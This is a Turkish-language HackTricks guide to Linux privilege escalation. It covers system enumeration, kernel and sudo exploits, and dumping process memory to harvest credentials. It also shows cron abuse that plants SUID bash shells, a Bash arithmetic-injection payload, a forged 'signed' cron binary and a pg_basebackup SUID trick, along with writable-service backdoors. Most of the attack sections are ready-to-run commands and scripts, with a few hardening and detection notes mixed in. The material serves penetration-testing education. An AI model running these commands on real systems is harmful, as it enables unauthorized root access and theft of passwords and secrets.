# Linux Yetki Yükseltme

{{#include ../../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### İşletim sistemi bilgileri

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

`PATH` değişkeni içindeki herhangi bir klasör üzerinde **yazma izinleriniz varsa** bazı kütüphaneleri veya binary'leri ele geçirebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgileri

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını belirleyin
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı **derlenmiş exploit'leri** burada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **derlenmiş exploit'leri** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web sitesindeki tüm vulnerable kernel version'larını çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploit'lerini aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim üzerinde çalıştırın, yalnızca kernel 2.x için exploit'leri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; kernel sürümünüz bazı kernel exploit'lerinde yazıyor olabilir. Böylece bu exploit'in geçerli olduğundan emin olabilirsiniz.

Additional kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Şurada listelenen savunmasız sudo sürümlerine göre:
```bash
searchsploit sudo
```
sudo sürümünün zafiyetli olup olmadığını bu grep'i kullanarak kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 öncesindeki Sudo sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**), `/etc/nsswitch.conf` dosyası user-controlled bir directory'den kullanıldığında, ayrıcalıksız local user'ların sudo `--chroot` option'ı üzerinden ayrıcalıklarını root seviyesine yükseltmesine olanak tanır.

İşte bu [vulnerability](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot). Exploit'i çalıştırmadan önce `sudo` version'ınızın vulnerable olduğunu ve `chroot` feature'ını desteklediğini kontrol edin.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) sayfasına bakın.

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 öncesindeki Sudo sürümleri (etkilendiği bildirilen aralık: **1.8.8–1.9.17**), host-based sudoers rules'larını gerçek hostname yerine `sudo -h <host>` üzerinden user tarafından sağlanan **hostname** kullanarak değerlendirebilir. sudoers başka bir host üzerinde daha geniş privileges veriyorsa, bu host'u local olarak **spoof** edebilirsiniz.

Gereksinimler:
- Vulnerable sudo version
- Host-specific sudoers rules (host, mevcut hostname veya `ALL` değil)

Örnek sudoers pattern'i:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
İzin verilen host'u spoof ederek exploit edin:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Spoofed name çözümlemesi engelleniyorsa, DNS lookuplarını önlemek için bunu `/etc/hosts` dosyasına ekleyin veya loglarda/config dosyalarında zaten görünen bir hostname kullanın.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu zafiyetin nasıl exploit edilebileceğine dair bir **örnek** için **HTB'deki smasher2 makinesine** bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Bir container içindeyseniz, aşağıdaki container-security bölümüyle başlayın ve ardından runtime-specific abuse sayfalarına pivot edin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Sürücüler

**Nelerin mount ve unmount edildiğini**, nerede ve neden yapıldığını kontrol edin. Herhangi bir şey unmount edilmişse onu mount etmeyi ve private info içerip içermediğini kontrol etmeyi deneyebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Faydalı yazılımlar

Faydalı binary'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler'ın kurulu olup olmadığını** kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekiyorsa faydalıdır; çünkü bunları kullanacağınız makinede (veya benzer bir makinede) compile etmeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Güvenlik Açığı İçeren Yazılımlar

**Kurulu paketlerin ve hizmetlerin sürümünü** kontrol edin. Örneğin, yetki yükseltmek için istismar edilebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli kurulu yazılımların sürümünü manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, makinenin içinde yüklü olan güncel olmayan ve güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS** da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayacak çok fazla bilgi göstereceğini unutmayın. Bu nedenle, yüklü herhangi bir yazılım sürümünün bilinen exploit'lere karşı savunmasız olup olmadığını kontrol edecek OpenVAS veya benzeri bazı uygulamaların kullanılması önerilir._

## Processes

Yürütülen **işlemlere** göz atın ve herhangi bir işlemin **olması gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin root tarafından yürütülen bir tomcat olabilir mi?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman çalışan [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları abuse ederek yetkileri yükseltebilirsiniz. **Linpeas**, process'in command line'ı içindeki `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **process binary'leri üzerindeki yetkilerinizi** kontrol edin; belki bir başkasının binary'sinin üzerine yazabilirsiniz.

### Kullanıcılar arası parent-child zincirleri

Bir **farklı user** altında çalışan child process'in parent'ından farklı bir **user** altında çalışması, otomatik olarak malicious olduğu anlamına gelmez; ancak yararlı bir **triage signal**'idir. Bazı geçişler beklenen davranışlardır (`root` bir service user başlatır, login manager'lar session process'leri oluşturur), ancak olağandışı zincirler wrapper'ları, debug helper'larını, persistence'ı veya zayıf runtime trust boundary'lerini ortaya çıkarabilir.

Hızlı inceleme:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Şaşırtıcı bir chain bulursanız, üst komut satırını ve davranışını etkileyen tüm dosyaları (`config`, `EnvironmentFile`, yardımcı script'ler, çalışma dizini, yazılabilir argümanlar) inceleyin. Gerçek privesc yollarının bazılarında child'ın kendisi yazılabilir değildi; ancak **parent-controlled config** veya yardımcı chain yazılabilirdi.

### Silinmiş executable'lar ve silinmiş-açık dosyalar

Runtime artifact'ları, **silindikten sonra bile** çoğu zaman erişilebilir durumda kalır. Bu, hem privilege escalation için hem de hâlihazırda hassas dosyaları açık tutan bir process'ten kanıt kurtarmak için kullanışlıdır.

Silinmiş executable'ları kontrol edin:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
If `/proc/<PID>/exe` `(deleted)` ifadesini gösteriyorsa, process hâlâ eski binary image'ını memory'den çalıştırıyordur. Bu, araştırılması gereken güçlü bir sinyaldir çünkü:

- kaldırılan executable ilginç string'ler veya credentials içerebilir
- çalışan process hâlâ yararlı file descriptor'lar sunabilir
- silinmiş bir privileged binary, yakın zamanda yapılmış bir tampering veya cleanup girişimine işaret edebilir

Silinmiş ve açık durumdaki dosyaları global olarak toplayın:
```bash
lsof +L1
```
İlginç bir descriptor bulursanız, onu doğrudan elde edin:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Bu, bir process hâlâ silinmiş bir secret, script, database export veya flag file açık tuttuğunda özellikle değerlidir.

### Process monitoring

Process'leri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık aralıklarla çalıştırılan veya bir dizi gereksinim karşılandığında yürütülen vulnerable process'leri tespit etmek için oldukça yararlı olabilir.

### Process memory

Bir server'ın bazı servisleri **credentials bilgilerini memory içinde clear text olarak saklar**.\
Normalde diğer kullanıcılara ait process'lerin memory'sini okumak için **root privileges** gerekir; bu nedenle bu yöntem genellikle zaten root olduğunuzda ve daha fazla credentials keşfetmek istediğinizde kullanışlıdır.\
Ancak **normal bir user olarak sahibi olduğunuz process'lerin memory'sini okuyabileceğinizi** unutmayın.

> [!WARNING]
> Günümüzde çoğu machine'in **ptrace'e varsayılan olarak izin vermediğini** unutmayın; bu, unprivileged user'ınıza ait diğer process'leri dump edemeyeceğiniz anlamına gelir.
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ dosyası ptrace'in erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: Aynı uid'e sahip oldukları sürece tüm process'ler debug edilebilir. ptrace'in klasik çalışma şekli budur.
> - **kernel.yama.ptrace_scope = 1**: Yalnızca bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Yalnızca admin ptrace kullanabilir; bunun için CAP_SYS_PTRACE capability'si gerekir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir process ptrace ile trace edilemez. Bu değer ayarlandıktan sonra ptrace'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

Bir FTP service'in memory'sine erişiminiz varsa (örneğin), Heap'i elde edip içinde credentials arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için **maps, belleğin bu process'in sanal adres alanı içinde nasıl eşlendiğini gösterir**; ayrıca **eşlenen her bölgenin izinlerini de gösterir**. **mem** pseudo file'ı **process'in belleğini doğrudan sunar**. **maps** file'ından hangi **memory region**'ların okunabilir olduğunu ve offset'lerini öğreniriz. Bu bilgiyi kullanarak **mem file'ı içinde ilgili konumlara seek işlemi gerçekleştirir ve okunabilir tüm bölgeleri** bir file'a dökeriz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`, sanal belleğe değil, sistemin **fiziksel** belleğine erişim sağlar. Kernel'in sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle `/dev/mem` yalnızca **root** ve **kmem** grubunun okuyabileceği şekilde yapılandırılmıştır.
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux için ProcDump

ProcDump, Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir sürecin belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait olan sürecin belleğini dökebilirsiniz
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) dosyasındaki Script A.5 (root gereklidir)

### Süreç Belleğinden Kimlik Bilgileri

#### Manuel örnek

authenticator sürecinin çalıştığını tespit ederseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'in belleğini dump edebilir (process belleğini dump etmenin farklı yollarını bulmak için önceki bölümlere bakın) ve bellek içinde credential'ları arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) aracı **bellekten düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** kimlik bilgilerini **çalacaktır**. Düzgün çalışması için root ayrıcalıkları gerekir.

| Özellik                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regex Aramaları/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron işleri

### Root olarak çalışan Crontab UI (alseambusher) – web tabanlı scheduler privesc

Bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback’e bağlıysa, SSH local port-forwarding üzerinden yine de erişebilir ve ayrıcalıklı bir job oluşturarak yetki yükseltebilirsiniz.

Tipik zincir
- Loopback-only portunu (ör. 127.0.0.1:8000) ve Basic-Auth realm bilgisini `ss -ntlp` / `curl -v localhost:8000` ile keşfedin
- Operational artifact’larda kimlik bilgilerini bulun:
- `zip -P <password>` içeren backup/script dosyaları
- `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` değerlerini açığa çıkaran systemd unit
- Tunnel oluşturun ve giriş yapın:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluşturun ve hemen çalıştırın (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve minimum izinlerle kısıtlayın
- localhost'a bağlayın ve erişimi firewall/VPN üzerinden ayrıca kısıtlayın; parolaları yeniden kullanmayın
- Secret'ları unit file'lara gömmekten kaçının; secret store'ları veya yalnızca root'un okuyabildiği EnvironmentFile'ları kullanın
- Talep üzerine gerçekleştirilen job çalıştırmaları için audit/logging'i etkinleştirin



Herhangi bir scheduled job'ın vulnerable olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten yararlanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlink kullanabilir misiniz? root'un kullandığı dizinde belirli dosyalar oluşturabilir misiniz?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
`run-parts` kullanılıyorsa, hangi adların gerçekten çalıştırılacağını kontrol edin:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Bu, false positive'ları önler. Yazılabilir bir periodic directory yalnızca payload filename yerel `run-parts` kurallarıyla eşleşiyorsa işe yarar.

### Cron yolu

Örneğin _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_"user" kullanıcısının /home/user üzerinde yazma yetkisine sahip olduğuna dikkat edin_)

Bu crontab içinde root kullanıcısı path'i ayarlamadan bir command veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Şunu kullanarak bir root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Wildcard kullanan bir script ile Cron (Wildcard Injection)

Bir script root tarafından çalıştırılıyor ve bir command içinde “**\***” bulunuyorsa, beklenmedik şeyler (privesc gibi) gerçekleştirmek için bunu exploit edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wildcard bir path ile başlıyorsa** _**/some/path/\***_ **, vulnerable değildir (hatta** _**./\***_ **bile değildir).**

Daha fazla wildcard exploitation trick için aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Cron log parser'larında Bash arithmetic expansion injection

Bash, `((...))`, `$((...))` ve `let` içinde arithmetic evaluation işleminden önce parameter expansion ve command substitution gerçekleştirir. Root olarak çalışan bir cron/parser, güvenilmeyen log alanlarını okur ve bunları bir arithmetic context içine aktarırsa saldırgan, cron çalıştığında root olarak çalışacak bir `$(...)` command substitution enjekte edebilir.

- Nasıl çalışır: Bash'te expansions şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu nedenle `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), ardından kalan numeric `0` arithmetic işlemi için kullanılır ve script errors olmadan devam eder.

- Tipik vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log içine attacker-controlled text yazılmasını sağlayın; numeric-looking field, bir command substitution içersin ve bir digit ile bitsin. Arithmetic işleminin valid kalması için command'inizin stdout'a çıktı vermediğinden (veya çıktıyı redirect ettiğinizden) emin olun.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwrite ve symlink

**Root tarafından çalıştırılan bir cron script'ini değiştirebiliyorsanız**, kolayca shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root tarafından çalıştırılan script, **tam erişiminizin olduğu bir dizini** kullanıyorsa bu klasörü silip **sizin kontrol ettiğiniz bir scripti sunan başka bir klasöre symlink oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink doğrulaması ve daha güvenli dosya işlemleri

Yollar aracılığıyla dosya okuyan veya dosyalara yazan ayrıcalıklı script'leri/binary'leri incelerken, link'lerin nasıl ele alındığını doğrulayın:

- `stat()` bir symlink'i takip eder ve hedefin metadata bilgilerini döndürür.
- `lstat()` link'in kendisine ait metadata bilgilerini döndürür.
- `readlink -f` ve `namei -l`, nihai hedefin çözümlenmesine ve her yol bileşeninin izinlerinin görüntülenmesine yardımcı olur.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Defender'lar/developer'lar için symlink tricks'e karşı daha güvenli pattern'ler şunları içerir:

- `O_EXCL` ile `O_CREAT`: path zaten mevcutsa başarısız olur (attacker tarafından önceden oluşturulmuş link'leri/dosyaları engeller).
- `openat()`: işlemleri güvenilir bir directory file descriptor'a göreli olarak gerçekleştirir.
- `mkstemp()`: temporary file'ları güvenli permission'larla atomik olarak oluşturur.

### Yazılabilir payload'lara sahip özel imzalı cron binary'leri

Blue team'ler bazen cron tarafından çalıştırılan binary'leri, custom bir ELF section'ı dışarı aktarıp root olarak çalıştırmadan önce bir vendor string için `grep` uygulayarak "imzalar". Bu binary group-writable ise (ör. `root:devs 770` sahibi `/opt/AV/periodic-checks/monitor`) ve signing material'ı leak edebiliyorsanız, section'ı forge ederek cron task'ını ele geçirebilirsiniz:

1. Verification flow'u yakalamak için `pspy` kullanın. Era'da root, `objcopy --dump-section .text_sig=text_sig_section.bin monitor` komutunu çalıştırdı; ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` komutunu çalıştırdı ve daha sonra file'ı execute etti.
2. Leaked key/config'i (`signing.zip` içinden) kullanarak beklenen certificate'ı yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Malicious bir replacement oluşturun (ör. bir SUID bash bırakın veya SSH key'inizi ekleyin) ve `grep`'in başarılı olması için certificate'ı `.text_sig` içine embed edin:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Execute bit'lerini koruyarak scheduled binary'nin üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron run'ını bekleyin; naive signature check başarılı olduğunda payload'ınız root olarak çalışır.

### Sık çalıştırılan cron job'ları

Her 1, 2 veya 5 dakikada bir çalıştırılan process'leri aramak için process'leri monitor edebilirsiniz. Belki bundan faydalanarak privileges escalate edebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede monitor etmek**, **daha az çalıştırılan command'lere göre sıralamak** ve en çok çalıştırılan command'leri silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Şunları da kullanabilirsiniz:** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu araç başlayan her process'i izler ve listeler).

### Saldırganın ayarladığı mode bit'lerini koruyan Root backup'ları (pg_basebackup)

Root-owned bir cron, yazma izniniz olan bir database directory üzerinde `pg_basebackup` (veya herhangi bir recursive copy) çalıştırıyorsa, bir **SUID/SGID binary** yerleştirerek bunun aynı mode bit'leriyle backup output'a **root:root** olarak yeniden kopyalanmasını sağlayabilirsiniz.

Tipik discovery akışı (düşük yetkili bir DB user olarak):
- Her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komut çağıran root cron'u tespit etmek için `pspy` kullanın.
- Source cluster'ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve job sonrasında destination'ın (`/opt/backups/current`) root-owned olduğunu doğrulayın.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Bu, `pg_basebackup` cluster'ı kopyalarken dosya mode bitlerini koruduğu için çalışır; root tarafından çalıştırıldığında hedef dosyalar **root sahipliği + saldırganın seçtiği SUID/SGID** değerlerini devralır. İzinleri koruyan ve çalıştırılabilir bir konuma yazan benzer herhangi bir ayrıcalıklı backup/copy rutini savunmasızdır.

### Görünmez cron jobs

Bir yorumdan sonra **satır sonu karakteri olmadan carriage return** koyarak bir cronjob oluşturmak mümkündür ve cron job çalışır. Örnek (carriage return karakterine dikkat edin):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Bu tür bir gizli girişi tespit etmek için cron dosyalarını kontrol karakterlerini görünür kılan araçlarla inceleyin:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin; yazabiliyorsanız, servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor'unuzu çalıştırması** için dosyayı **değiştirebilirsiniz** (makine yeniden başlatılana kadar beklemeniz gerekebilir).\
Örneğin, **`ExecStart=/tmp/script.sh`** ile backdoor'unuzu .service dosyasının içinde oluşturun.

### Yazılabilir servis binary'leri

Servisler tarafından çalıştırılan binary'ler üzerinde **yazma izinleriniz** varsa, servisler yeniden çalıştırıldığında backdoor'ların çalıştırılması için bunları backdoor'larla değiştirebileceğinizi unutmayın.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu şekilde görebilirsiniz:
```bash
systemctl show-environment
```
